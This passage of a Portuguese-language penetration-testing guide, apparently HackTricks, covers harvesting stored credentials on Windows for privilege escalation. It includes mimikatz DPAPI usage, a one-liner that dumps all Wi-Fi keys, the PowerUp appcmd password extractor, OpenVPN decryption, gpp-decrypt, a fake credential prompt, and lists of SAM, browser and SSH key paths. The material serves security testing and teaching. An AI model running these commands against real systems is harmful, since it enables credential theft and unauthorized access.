As chaves RSA do usuário criptografadas com DPAPI são armazenadas no diretório `%APPDATA%\Microsoft\Protect\{SID}`, onde `{SID}` representa o [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) do usuário. **A chave DPAPI, localizada junto à chave mestra que protege as chaves privadas do usuário no mesmo arquivo**, normalmente consiste em 64 bytes de dados aleatórios. (É importante observar que o acesso a esse diretório é restrito, impedindo a listagem de seu conteúdo pelo comando `dir` no CMD, embora ele possa ser listado pelo PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Você pode usar o **módulo mimikatz** `dpapi::masterkey` com os argumentos apropriados (`/pvk` ou `/rpc`) para descriptografá-lo.

Os **arquivos de credenciais protegidos pela senha mestra** geralmente estão localizados em:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Você pode usar o **mimikatz module** `dpapi::cred` com o `/masterkey` apropriado para descriptografar.\
Você pode **extrair muitas** **masterkeys** **da memória** com o módulo `sekurlsa::dpapi` (se você for root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenciais do PowerShell

As **credenciais do PowerShell** são frequentemente usadas em tarefas de **scripting** e automação como uma forma conveniente de armazenar credenciais criptografadas. As credenciais são protegidas usando **DPAPI**, o que normalmente significa que só podem ser descriptografadas pelo mesmo usuário no mesmo computador em que foram criadas.

Uma credencial exportada pode ter um nome de arquivo arbitrário ou um caminho `.xml`. Quando um script ou inventário de arquivos indicar um desses arquivos, resolva o diretório de perfil real da conta em vez de presumir `C:\Users`: [o Windows pode colocar perfis em outros locais](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Um arquivo legível é apenas uma pista; [o `Export-Clixml` do Windows vincula uma credencial criptografada ao usuário e ao computador que a exportaram](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), e qualquer conta recuperada também precisa ter direitos válidos no serviço pretendido. Inspecione primeiro os caminhos e as ACLs, sem exibir valores criptografados ou em texto simples durante a enumeração de rotina.

Para **descriptografar** credenciais PS do arquivo que as contém, você pode fazer o seguinte:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Conexões RDP salvas

Você pode encontrá-las em `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
e em `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Comandos executados recentemente

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Gerenciador de Credenciais da Área de Trabalho Remota**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use o módulo `dpapi::rdg` do **Mimikatz** com o `/masterkey` apropriado para **descriptografar arquivos .rdg**\
Você pode **extrair muitas masterkeys DPAPI** da memória com o módulo `sekurlsa::dpapi` do Mimikatz

**O mRemoteNG usa um armazenamento de conexões diferente.** Inspecione XML legível em `%APPDATA%\mRemoteNG` e nos Documentos do usuário, incluindo arquivos com nomes comuns, como `config.xml`. Identifique o esquema de conexões e os atributos `Password` criptografados antes de considerar um arquivo XML uma pista de credenciais. O valor armazenado não é uma senha DPAPI/RDCMan; a recuperação depende das configurações de criptografia do arquivo e de ter sido usada uma master password personalizada. Evite exibir valores criptografados durante a enumeração ampla.

**As exportações de perfis do Remote Desktop Plus** também podem ser legíveis nos diretórios dos usuários ou em uma pasta de administração compartilhada. Uma exportação legada `profiles.xml` tem entradas `Data/Profile` com elementos `ProfileName`, `Password` e `Secure`. Considere um elemento de senha não vazio uma pista de credenciais, sem exibi-lo nem presumir que esteja em texto simples: [o fornecedor informa](https://www.donkz.nl/) que a proteção do perfil pode estar vinculada à conta e ao computador que o criou ou ser configurada com menos rigor. Confirme a origem do arquivo e as condições de recuperação antes de confiar nele.

### Sticky Notes

Às vezes, as pessoas salvam senhas e outras informações em aplicativos de notas adesivas. O aplicativo Sticky Notes empacotado da Microsoft costuma armazenar notas em `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; aplicativos mais antigos ou diferentes podem usar outros locais no perfil do usuário, incluindo LevelDB. Identifique o aplicativo instalado e o formato de armazenamento antes de considerar a ausência de um arquivo SQLite como prova de que não há notas.

Se o Sticky Notes estiver usando o write-ahead logging do SQLite, uma cópia apenas de `plum.sqlite` pode omitir notas confirmadas recentemente. Mantenha o `plum.sqlite-wal` correspondente junto com uma cópia consistente do banco de dados e inclua `plum.sqlite-shm`, se disponível; o índice de memória compartilhada pode ser recriado, mas o WAL faz parte do estado persistente do banco de dados. Consulte [a documentação do WAL do SQLite](https://www.sqlite.org/wal.html). Uma nota que contenha o nome de uma conta ou uma senha é apenas uma pista de credenciais: verifique separadamente a conta, o acesso permitido e a reutilização da senha. Um registro criptografado de um gerenciador de senhas também exige a chave de descriptografia real e a interpretação específica do aplicativo antes que possa comprovar um login com privilégios mais altos.

### AppCmd.exe

**Observe que, para recuperar senhas do AppCmd.exe, você precisa ser Administrator e executar com um nível High Integrity.**\
O **AppCmd.exe** está localizado no diretório `%systemroot%\system32\inetsrv\`.\
Se esse arquivo existir, é possível que algumas **credenciais** tenham sido configuradas e possam ser **recuperadas**.

Este código foi extraído de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Verifique se `C:\Windows\CCM\SCClient.exe` existe .\
Os instaladores são **executados com privilégios SYSTEM**, muitos são vulneráveis a **DLL Sideloading (Informações de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Arquivos e Registro (Credenciais)

### Artefatos de credenciais no registro de ferramentas de suporte

Algumas instalações antigas de suporte remoto mantêm nomes de valores relacionados a senhas em chaves fixas do registro do aplicativo. Por exemplo, `SecurityPasswordAES` do TeamViewer identificava uma senha estática de sessão configurada em versões anteriores à 9, de acordo com a [explicação do fornecedor sobre a chave do registro](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Um marcador no nome do valor serve apenas como pista para investigação: verifique a versão instalada, se os dados do valor podem ser lidos, seu formato e o comportamento atual de autenticação antes de avaliar essa credencial. Passar de uma senha de suporte remoto para uma conta Windows com mais privilégios também exige que a senha seja realmente reutilizada nessa conta e que haja autorização para acessá-la. Não inclua texto cifrado nem senhas recuperadas na saída de enumeração rotineira.

### Planilhas compartilhadas com folhas protegidas

Se houver suspeita de que uma pasta de trabalho compartilhada e legível contenha dados de contas, diferencie **criptografia de arquivo** de proteção de planilha ou colunas ocultas. A [Microsoft afirma](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) que a proteção de planilha controla a edição e não é um recurso de segurança; por si só, ela não comprova que o conteúdo da pasta de trabalho está criptografado. Analise apenas arquivos relevantes cujo acesso seja autorizado e evite imprimir possíveis segredos durante uma enumeração ampla. Um caminho para um `.xlsx` legível, uma planilha protegida ou uma coluna oculta, por si só, não comprova que existam credenciais nem que alguma conta tenha privilégios mais elevados; verifique separadamente os dados reais e os direitos atuais da conta.

### Patches de alterações retidos por servidores de CI

Um servidor de CI pode manter as alterações de código-fonte enviadas em seu diretório de dados mesmo após o término da compilação. A [TeamCity documenta](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` como armazenamento de alterações de execução remota; o diretório de dados pode ser configurado e não fica necessariamente em `ProgramData`. Um patch legível pode preservar referências removidas ou adicionadas a um arquivo de credenciais, uma chave de criptografia ou um script que use ambos. Por exemplo, um fluxo de trabalho do PowerShell com `ConvertTo-SecureString -Key` precisa tanto da chave AES quanto da string criptografada; a [Microsoft documenta](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) que a chave é fornecida separadamente. Primeiro, analise apenas os nomes de patches acessíveis; depois, inspecione o conteúdo relevante com autorização, sem imprimir segredos na saída de enumeração rotineira. Um caminho de patch, um valor criptografado ou uma referência a uma chave, por si só, não comprova a existência de uma credencial válida ou acesso a privilégios mais elevados. Restrinja as ACLs do diretório de dados e evite incluir segredos nas alterações de compilação.

### Rotação personalizada de senhas de administrador local

Um rotacionador de senhas desenvolvido internamente pode armazenar uma senha criptografada de administrador local em um serviço local e manter as credenciais do banco de dados em um arquivo `.env` legível ou ao lado do binário do atualizador. Analise em conjunto a tarefa agendada do atualizador, a conta, as ACLs da configuração, o listener e as permissões do banco de dados. Mesmo um banco de dados acessível apenas por loopback pode ser acessado por um usuário local que tenha credenciais válidas, mas a autenticação, por si só, não comprova a permissão para ler os registros relevantes. Se a seed de criptografia ou o material da chave estiver acessível ao lado do texto cifrado, analise a derivação exata da chave antes de confiar na criptografia. Um esquema que deriva deterministicamente uma chave AES de uma seed exposta usando Go [`math/rand`](https://pkg.go.dev/math/rand) não é adequado para proteger essa senha; a documentação do Go informa que esse pacote é impróprio para geração de aleatoriedade sensível à segurança. Confirme que qualquer senha recuperada ainda é válida e pertence a uma conta do grupo Administrators local antes de considerá-la um caminho para escalonamento. Uma tarefa agendada, um caminho para `.env` ou um bloco criptografado, por si só, não comprova nenhuma dessas condições. Não inclua senhas nem material de chave na saída de enumeração rotineira.

Use o [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) para gerenciar senhas de administrador local. O armazenamento no diretório ou no Entra e os controles de acesso são diferentes dos de um banco de dados local personalizado; as [funções do Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) também determinam se um usuário autenticado do banco de dados pode ler um índice específico.

### Arquivos de plugins de servidor Java e reutilização de credenciais

Alguns plugins de servidor Java são distribuídos como arquivos JAR no diretório `plugins` de um servidor. Um plugin personalizado legível pode conter configuração ou bytecode com uma credencial de serviço incorporada. Analise o arquivo somente quando autorizado e não inclua segredos recuperados na saída de enumeração rotineira. Um caminho de plugin, por si só, não comprova a existência de um segredo, e uma senha de serviço recuperada só leva a privilégios mais elevados se também for válida para uma conta com mais privilégios. Verifique as ACLs dos arquivos relevantes e substitua credenciais reutilizadas por segredos distintos. Consulte o [guia de instalação de plugins do PaperMC](https://docs.papermc.io/paper/adding-plugins/) para ver a estrutura de diretórios e a [documentação de JAR da Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) para informações sobre o conteúdo dos arquivos.

### Credenciais do banco de dados incorporado do Openfire

Uma instalação do Openfire que use o banco de dados incorporado pode manter `openfire.script` em `Openfire\embedded-db`. Se a conta atual puder ler esse arquivo, analise conjuntamente os registros `OFUSER` e a propriedade `passwordKey`. A [documentação do provedor de usuários](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) do Openfire informa que as senhas podem ser armazenadas em texto simples ou criptografadas com uma chave armazenada nessa propriedade. Uma senha recuperada só importa para o escalonamento se ainda for válida para uma identidade com mais privilégios; o nome do arquivo, por si só, não comprova acesso de leitura nem reutilização de credenciais. O caminho serve como pista de inventário; não inclua o conteúdo do banco de dados nem credenciais na saída de enumeração rotineira.

O arquivo separado `Openfire\conf\openfire.xml` pode revelar as portas configuradas e a interface de bind do console de administração, mesmo quando é usado um banco de dados externo. O Openfire costuma vincular o console de administração ao loopback; ainda assim, uma conta local pode acessar esse endereço se o listener estiver em execução. Verifique em conjunto o listener real, a função de administrador autorizada, a política de upload de plugins e a identidade do serviço Openfire. Um administrador que possa instalar um plugin pode fazer com que o código do plugin seja executado no contexto do serviço, o que pode resultar em privilégios elevados quando o serviço é executado como LocalSystem. Uma senha correspondente ou um caminho de configuração legível, por si só, não comprova acesso ao console de administração nem execução de código. Consulte o [guia de instalação e gerenciamento de plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) do fornecedor e a [propriedade da API de upload de plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Configuração do servidor de gerenciamento forense

As configurações do servidor Velociraptor, geralmente chamadas `server.config.yaml`, podem conter `CA.private_key` da CA interna. Se um usuário com menos privilégios puder ler essa chave, talvez consiga emitir um certificado de cliente da API. A possibilidade de isso levar a privilégios mais elevados depende das funções de usuário do servidor, da acessibilidade da API e da identidade sob a qual o servidor ou o agente de destino é executado. Uma configuração de cliente contém material diferente; encontrá-la não comprova acesso à CA do servidor. Algumas implantações mantêm a chave privada da CA offline, portanto uma configuração de servidor legível também pode não conter a chave de assinatura.

Em um servidor Windows, inspecione a ACL da configuração do **servidor** no diretório de instalação e de eventuais cópias de backup protegidas. Um local possível é `%ProgramFiles%\VelociraptorServer\server.config.yaml`; se o caminho configurado para o serviço for diferente, use-o. Confirme que a identidade atual pode ler o arquivo e que `CA.private_key` realmente está presente. Evite imprimir a chave privada em logs ou na saída de enumeração. O fluxo de trabalho `config api_client` do fornecedor usa a chave da CA para emitir um certificado de cliente, mas também é necessária uma função efetiva no servidor; criá-la ou alterá-la pode exigir acesso de gravação ao banco de dados ou uma reinicialização. Uma identidade privilegiada já existente no servidor pode oferecer um caminho mesmo quando essas gravações não são possíveis. Consultas à API com direitos de execução são executadas no contexto relevante do servidor ou do agente, que pode ter privilégios elevados.

Proteja a configuração do servidor e os backups com ACLs restritivas, mantenha a chave de assinatura da CA offline sempre que possível e limite as funções da API e o acesso aos listeners. Consulte a [documentação da API do Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) e as [orientações de configuração de segurança](https://docs.velociraptor.app/docs/deployment/security/).

### Credenciais do PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY é um gerenciador de sessões separado. Seu armazenamento nativo criptografado pode estar em `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, enquanto um backup de sessão exportado pode se chamar `sessions-backup.dat` e estar armazenado em outro local. O [guia de exportação da SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) informa que as exportações são criptografadas com senha e podem conter sessões, chaves, scripts, tags e relacionamentos; o [fórum de suporte](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) identifica o armazenamento nativo. Verifique primeiro as permissões e os caminhos dos arquivos. Encontrar qualquer um desses arquivos não revela sua senha nem comprova que alguma credencial salva ainda seja válida ou tenha privilégios mais elevados.

### Chaves de host SSH do PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Chaves SSH no Registro

Chaves privadas SSH podem ser armazenadas na chave do Registro `HKCU\Software\OpenSSH\Agent\Keys`, então verifique se há algo interessante lá:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Se você encontrar qualquer entrada nesse caminho, provavelmente será uma chave SSH salva. Ela é armazenada criptografada, mas pode ser facilmente descriptografada usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Mais informações sobre essa técnica aqui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Se o serviço `ssh-agent` não estiver em execução e você quiser iniciá-lo automaticamente na inicialização, execute:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Parece que essa técnica não é mais válida. Tentei criar algumas chaves ssh, adicioná-las com `ssh-add` e fazer login via ssh em uma máquina. A chave do Registro HKCU\Software\OpenSSH\Agent\Keys não existe, e o procmon não identificou o uso de `dpapi.dll` durante a autenticação de chave assimétrica.

### Arquivos unattended

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Você também pode procurar esses arquivos usando **metasploit**: _post/windows/gather/enum_unattend_

Conteúdo de exemplo:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Backups do SAM e do SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Arquivos de backup legíveis do Windows Imaging (`.wim`) também podem conter hives offline de `SAM`, `SECURITY` e `SYSTEM`. Priorize diretórios de backup ou imagem acessíveis localmente e inspecione os **nomes dos membros** de uma imagem antes de extrair qualquer coisa; o nome de um arquivo `.wim`, por si só, não comprova a exposição de hives, e imagens comuns de `install.wim`, `boot.wim` e recuperação são pistas falsas frequentes. Um compartilhamento SMB é um caminho de acesso separado e só deve ser verificado quando estiver no escopo. Consulte as orientações da Microsoft sobre [imagens do Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) e a [referência de arquivos de hives do Registro](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Credenciais da Nuvem

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Pesquise por um arquivo chamado **SiteList.xml**

### Senha do GPP em cache

Havia um recurso que permitia implantar contas de administrador local personalizadas em um grupo de máquinas por meio das Group Policy Preferences (GPP). No entanto, esse método apresentava falhas de segurança significativas. Primeiro, qualquer usuário do domínio podia acessar os Group Policy Objects (GPOs), armazenados como arquivos XML no SYSVOL. Segundo, qualquer usuário autenticado podia descriptografar as senhas contidas nessas GPPs, criptografadas com AES256 usando uma chave padrão documentada publicamente. Isso representava um risco sério, pois poderia permitir que usuários obtivessem privilégios elevados.

Para mitigar esse risco, foi desenvolvida uma função para procurar arquivos GPP armazenados localmente em cache que contenham um campo "cpassword" não vazio. Ao encontrar esse arquivo, a função descriptografa a senha e retorna um objeto PowerShell personalizado. Esse objeto inclui detalhes sobre a GPP e o local do arquivo, ajudando a identificar e corrigir essa vulnerabilidade de segurança.

Pesquise estes arquivos em `C:\ProgramData\Microsoft\Group Policy\history` ou em _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior ao W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descriptografar o cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Usando crackmapexec para obter as senhas:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Exemplo de web.config com credenciais:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Arquivos de backup em um webroot do IIS

Um backup ZIP antigo colocado diretamente em um webroot servido pode expor arquivos de configuração anteriores e credenciais reutilizáveis. Verifique o caminho físico configurado para o site e se o arquivo está realmente acessível por HTTP antes de considerá-lo uma exposição. O caminho padrão `C:\inetpub\wwwroot` é apenas uma possibilidade. Um inventário local rápido pode listar nomes e tamanhos sem abrir os arquivos:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

O nome de um arquivo compactado não comprova que ele contenha um segredo nem que uma credencial recuperada conceda privilégios mais elevados.

### Credenciais do OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logs

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Solicitar credenciais

Você sempre pode **pedir ao usuário que informe suas credenciais ou até mesmo as credenciais de outro usuário** se achar que ele pode conhecê-las (observe que **pedir** diretamente ao cliente suas **credenciais** é realmente **arriscado**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Possíveis nomes de arquivos contendo credenciais**

Arquivos conhecidos que, há algum tempo, continham **senhas** em **texto simples** ou **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Os bancos de dados do Password Safe v3 costumam usar a extensão `.psafe3`. Trate um nome de arquivo correspondente como um possível cofre criptografado; sua presença não comprova que você consiga lê-lo, desbloqueá-lo ou usar quaisquer credenciais armazenadas. Ao verificar onde esses arquivos estão armazenados, confira os perfis de usuário acessíveis e as raízes configuradas de compartilhamento de arquivos.

Um arquivo KeePass `.kdbx` legível também é apenas uma pista de que há um cofre criptografado. Para desbloqueá-lo, é necessária a senha mestra correta e qualquer arquivo de chave ou fator de conta configurado. Se uma análise autorizada encontrar um par de hashes LM:NT em uma entrada, verifique a conta indicada e se o hash NT ainda é válido e aceito pelo serviço NTLM do alvo antes de considerar [pass-the-hash](../ntlm/README.md#pass-the-hash). Uma entrada no cofre não concede, por si só, privilégios de Administrator ou SYSTEM; o acesso ao serviço remoto, os direitos da conta e qualquer etapa separada de execução de serviço também precisam estar disponíveis. O inventário deve informar o caminho e a legibilidade do cofre, sem exibir o banco de dados nem as credenciais armazenadas.

Pesquise todos os arquivos propostos:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
